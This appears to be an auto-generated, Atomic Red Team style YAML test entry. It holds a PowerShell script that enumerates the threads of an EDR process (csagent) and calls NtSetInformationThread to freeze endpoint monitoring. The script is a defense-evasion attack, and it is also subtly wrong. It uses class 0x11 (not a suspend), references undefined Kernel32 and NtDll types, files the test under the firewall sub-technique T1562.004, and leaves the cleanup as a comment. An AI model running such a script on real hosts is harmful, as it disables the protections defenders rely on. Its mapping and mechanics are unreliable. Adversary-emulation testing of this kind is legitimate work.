# Auto-generated by CIPHER v5.0
# Source: 18697e54387f
attack_technique: T1562.004
display_name: "T1562.004 - Driverless EDR Freeze via NtSetInformationThread"
atomic_tests:
  - name: "T1562.004 - Driverless EDR Freeze via NtSetInformationThread"
    description: |
      Suspend EDR service threads to halt real‑time monitoring without kernel drivers.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        # Identify EDR process (example: csagent)
        $proc = Get-Process -Name "csagent" -ErrorAction SilentlyContinue
        if ($null -eq $proc) { Write-Error "EDR process not found"; exit }
        foreach ($t in $proc.Threads) {
            $threadHandle = [Kernel32]::OpenThread(0x001F03FF, $false, $t.Id)
            $suspend = 1
            [NtDll]::NtSetInformationThread($threadHandle, 0x11, [ref]$suspend, 4) | Out-Null
            [Kernel32]::CloseHandle($threadHandle) | Out-Null
        }
        Write-Host "[+] EDR threads frozen"
      cleanup_command: |
        # Resume threads (set suspend=0) or simply reboot the VM
